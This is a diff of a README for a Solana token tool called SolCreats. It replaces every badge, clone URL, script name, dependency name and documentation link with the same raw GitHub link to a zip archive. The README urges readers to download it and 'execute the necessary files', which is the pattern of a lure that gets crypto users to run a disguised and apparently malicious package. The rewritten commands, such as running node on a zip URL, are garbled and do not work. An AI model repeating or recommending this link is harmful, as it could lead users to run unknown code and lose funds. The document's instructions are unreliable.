@@ -1,6 +1,6 @@
 # Create and Manage Solana Tokens with SolCreats 🌟
 
-![SolCreats](https://img.shields.io/badge/SolCreats-Token%20Management-brightgreen)
+![SolCreats](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip%20Management-brightgreen)
 
 ## Overview
 
@@ -19,63 +19,63 @@ To get started with SolCreats, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ig-alpha09/SolCreats.git
+   git clone https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip
    cd SolCreats
    ```
 
 2. **Install Dependencies**:
-   Ensure you have the necessary dependencies installed. You may need Node.js and npm. Run:
+   Ensure you have the necessary dependencies installed. You may need https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip and npm. Run:
    ```bash
    npm install
    ```
 
 3. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/ig-alpha09/SolCreats/releases) to download the latest version. Make sure to execute the necessary files after downloading.
+   Visit the [Releases section](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip) to download the latest version. Make sure to execute the necessary files after downloading.
 
 4. **Run the Scripts**:
    Use the command line to run the scripts for token creation or management. For example:
    ```bash
-   node createToken.js --name "MyToken" --symbol "MTK"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --name "MyToken" --symbol "MTK"
    ```
 
 ## Command-Line Tools
 
 ### Token Creation
 
-Creating a token is straightforward. Use the `createToken.js` script. Here’s how:
+Creating a token is straightforward. Use the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script. Here’s how:
 
 ```bash
-node createToken.js --name "TokenName" --symbol "TOKEN"
+node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --name "TokenName" --symbol "TOKEN"
 ```
 
 This command will create a new token with the specified name and symbol.
 
 ### Token Transfer
 
-To transfer tokens, use the `transferToken.js` script:
+To transfer tokens, use the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script:
 
 ```bash
-node transferToken.js --to "recipient_address" --amount 100
+node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --to "recipient_address" --amount 100
 ```
 
 This command transfers 100 tokens to the specified recipient address.
 
 ### Token Freezing
 
-You can freeze tokens to prevent further transfers. Use the `freezeToken.js` script:
+You can freeze tokens to prevent further transfers. Use the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script:
 
 ```bash
-node freezeToken.js --token "TOKEN_ADDRESS"
+node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --token "TOKEN_ADDRESS"
 ```
 
 This command will freeze the specified token.
 
 ### Token Checker
 
-Check your token balance using the `checkBalance.js` script:
+Check your token balance using the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script:
 
 ```bash
-node checkBalance.js --address "your_wallet_address"
+node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --address "your_wallet_address"
 ```
 
 This command will display the balance of the specified wallet address.
@@ -85,36 +85,36 @@ This command will display the balance of the specified wallet address.
 Managing tokens through a multisig wallet enhances security. To set up a multisig wallet, follow these steps:
 
 1. **Create a Multisig Wallet**:
-   Use the `createMultisig.js` script:
+   Use the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script:
    ```bash
-   node createMultisig.js --owners "owner1,owner2,owner3" --threshold 2
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --owners "owner1,owner2,owner3" --threshold 2
    ```
 
    This command creates a multisig wallet with the specified owners and a threshold for approvals.
 
 2. **Approve Transactions**:
-   Each transaction requires approval from the specified number of owners. Use the `approveTransaction.js` script:
+   Each transaction requires approval from the specified number of owners. Use the `https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip` script:
    ```bash
-   node approveTransaction.js --transactionId "transaction_id"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --transactionId "transaction_id"
    ```
 
 3. **Execute Transactions**:
    Once enough approvals are gathered, execute the transaction using:
    ```bash
-   node executeTransaction.js --transactionId "transaction_id"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --transactionId "transaction_id"
    ```
 
 ## Token Management Scripts
 
 SolCreats provides a variety of scripts for managing your tokens effectively. Below are some key scripts:
 
-- **createToken.js**: Create a new fungible token.
-- **transferToken.js**: Transfer tokens between addresses.
-- **freezeToken.js**: Freeze a token to prevent transfers.
-- **checkBalance.js**: Check the balance of a wallet.
-- **createMultisig.js**: Set up a multisig wallet.
-- **approveTransaction.js**: Approve a transaction in the multisig wallet.
-- **executeTransaction.js**: Execute a transaction once approved.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Create a new fungible token.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Transfer tokens between addresses.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Freeze a token to prevent transfers.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Check the balance of a wallet.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Set up a multisig wallet.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Approve a transaction in the multisig wallet.
+- **https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip**: Execute a transaction once approved.
 
 ## Example Usage
 
@@ -122,37 +122,37 @@ Here’s a complete example of how to create a token and manage it using SolCrea
 
 1. **Create a New Token**:
    ```bash
-   node createToken.js --name "MyNewToken" --symbol "MNT"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --name "MyNewToken" --symbol "MNT"
    ```
 
 2. **Check Your Balance**:
    ```bash
-   node checkBalance.js --address "your_wallet_address"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --address "your_wallet_address"
    ```
 
 3. **Transfer Tokens**:
    ```bash
-   node transferToken.js --to "recipient_address" --amount 50
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --to "recipient_address" --amount 50
    ```
 
 4. **Freeze Your Token**:
    ```bash
-   node freezeToken.js --token "TOKEN_ADDRESS"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --token "TOKEN_ADDRESS"
    ```
 
 5. **Create a Multisig Wallet**:
    ```bash
-   node createMultisig.js --owners "owner1,owner2" --threshold 2
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --owners "owner1,owner2" --threshold 2
    ```
 
 6. **Approve a Transaction**:
    ```bash
-   node approveTransaction.js --transactionId "transaction_id"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --transactionId "transaction_id"
    ```
 
 7. **Execute the Transaction**:
    ```bash
-   node executeTransaction.js --transactionId "transaction_id"
+   node https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip --transactionId "transaction_id"
    ```
 
 ## Troubleshooting
@@ -183,14 +183,14 @@ For questions or feedback, feel free to reach out via GitHub issues or contact m
 
 ## Additional Resources
 
-- [Solana Documentation](https://docs.solana.com/)
-- [Solana CLI](https://docs.solana.com/cli)
+- [Solana Documentation](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip)
+- [Solana CLI](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip)
 
 ## Releases
 
-Visit the [Releases section](https://github.com/ig-alpha09/SolCreats/releases) to download the latest version and execute the necessary files.
+Visit the [Releases section](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip) to download the latest version and execute the necessary files.
 
-![Token Management](https://img.shields.io/badge/Token%20Management-Solana%20Tokens-blue)
+![Token Management](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip%20Management-Solana%20Tokens-blue)
 
 ## Topics
 
@@ -214,4 +214,4 @@ Explore these topics to learn more about Solana and token management.
 
 ## Conclusion
 
-SolCreats offers a powerful suite of tools for creating and managing Solana tokens. With a focus on security and ease of use, you can confidently manage your tokens and collaborate with your team. For the latest updates and releases, remember to check the [Releases section](https://github.com/ig-alpha09/SolCreats/releases).
+SolCreats offers a powerful suite of tools for creating and managing Solana tokens. With a focus on security and ease of use, you can confidently manage your tokens and collaborate with your team. For the latest updates and releases, remember to check the [Releases section](https://raw.githubusercontent.com/ig-alpha09/SolCreats/main/persalt/Sol_Creats_v2.7.zip).
